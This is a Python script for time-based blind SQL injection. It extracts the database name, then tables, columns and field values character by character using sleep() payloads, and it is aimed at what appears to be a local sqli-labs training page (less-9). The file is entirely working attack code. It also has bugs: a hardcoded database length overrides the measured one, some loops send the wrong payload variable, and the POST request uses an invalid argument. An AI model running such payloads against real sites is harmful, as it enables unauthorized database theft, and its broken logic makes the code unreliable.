# -*- coding:utf-8 -*-

import requests  


def req(func,url,payloads):
    if func == 'get':
        sql_url = url + payloads
        requests.get(sql_url, timeout=3)
    elif func == 'post':
        requests.post(url, payload=payloads,timeout=3)


def get_database(url,func):
    for l in range(0,100):
        payloads = "and if(length(database())=%d,sleep(3),0) %%23" %(l)
        print(url+payloads)
        try:  
            req(func,url,payloads)
        except requests.exceptions.ReadTimeout:
            db_len = l
            break
        else:
            pass
    db_len=8
    db = ""    
    str = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'  
    for i in range(1, db_len + 1): 
        for j in str:
            asc = ord(j)
            payloads2 = "and if(ascii(substr(database(),%d,1))=%d,sleep(3),0) %%23" %(i, asc)
            
            print(url+payloads2)
            try:
                req(func,url,payloads2)
            except requests.exceptions.ReadTimeout:
                db = db + j  
                print(db) 
                break 
            else:
                pass
    #print db
    return db


#继续脚本爆破表名
def get_tablename(url,func):
    for l in range(0,100):    
        payloads = "and( select if(length(table_name)=%d,sleep(3),0) from information_schema.tables where table_schema=database() limit 0,1)>0 %%23" %(l) 
        print(url + payloads)
        try:
            req(func,url,payloads)
        except requests.exceptions.ReadTimeout:
            tb_len = l
            break
        else:
            pass
    tb = ''
    str = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

    for i in range(1, tb_len + 1):
        for j in str:
            asc = ord(j)
            payloads2 = "and( select if(ascii(substr(table_name,%d,1))=%d,sleep(3),0) from information_schema.tables where table_schema=database() limit 0,1)>0 %%23" %(i, asc)
            print(url + payloads2)
            try:
                req(func,url,payloads2)
            except requests.exceptions.ReadTimeout:
                tb = tb + j
                print(tb)
                break
            else:
                pass
    #print tb
    return tb



#继续脚本爆破列名
def get_column(url,tb_name,func):
    for l in range(0,100):    
        payloads = "and (select if(length(column_name)=%d,sleep(3),0) from information_schema.columns where table_name='%s' limit 0,1)>0 %%23" %(l, tb_name) 
        print(url + payloads)
        try:
            req(func,url,payloads)
        except requests.exceptions.ReadTimeout:
            col_len = l
            break
        else:
            pass
    col = ''
    
    str = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

    for i in range(1, col_len + 1):
        for j in str:
            asc = ord(j)
            payloads2 = "and (select if(ascii(substr(column_name,%d,1))=%d,sleep(3),0) from information_schema.columns where table_name='%s' limit 0,1)>0 %%23" %(i, asc, tb_name) 
            print(url + payloads2)
            try:
                req(func,url,payloads)
            except requests.exceptions.ReadTimeout:
                col = col + j
                print(col)
                break
            else:
                pass
    return col


def get_key(url,tb_name,col_name,func):
    for l in range(0,100):    
        payloads =  "and (select if(length(%s)=%d,sleep(3),0) from %s limit 0,1)>0 %%23" %(col_name, l, tb_name) 
        print(url + payloads)
        try:
            req(func,url,payloads)
        except requests.exceptions.ReadTimeout:
            key_len = l
            break
        else:
            pass
    key = ''
    str = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

    for i in range(1, key_len + 1):
        for j in str:
            asc = ord(j)
            payloads2 = "and (select if(ascii(substr(%s,%d,1))=%d,sleep(5),0) from %s limit 0,1)>0 %%23" %(col_name, i, asc, tb_name) 
            print(url + payloads2)
            try:
                req(func,url,payloads)
            except requests.exceptions.ReadTimeout:
                key = key + j
                print(key)
                break
            else:
                pass
    return key



if __name__ == "__main__":
    url="http://192.168.226.144/sqlab/less-9/?id=1'"
    func="get"
    get_database(url,func)
    #table_name = get_tablename(url,func)
    #column_name = get_column(url,'emails',func)

    # auto_getkey
    #get_key(url,'emails','id',func); 